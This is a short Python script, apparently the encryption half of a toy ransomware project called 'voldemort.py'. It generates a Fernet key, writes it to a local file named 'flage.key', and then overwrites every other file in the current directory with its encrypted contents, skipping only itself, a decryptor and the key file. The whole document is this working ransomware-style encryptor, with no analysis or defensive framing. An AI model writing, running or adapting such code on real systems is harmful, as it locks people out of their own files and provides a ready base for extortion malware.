#crypting
import os
from cryptography.fernet import Fernet
#files well not crypet
files = []
for file in os.listdir():
    if file in ["voldemort.py", "decrypted.py", "flage.key"]:
        continue
    if os.path.isfile(file):
        files.append(file)
# generate a key 
key = Fernet.generate_key()
#put the key on falge.key
with open("flage.key", "wb") as flage:
    flage.write(key)
#crypet
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
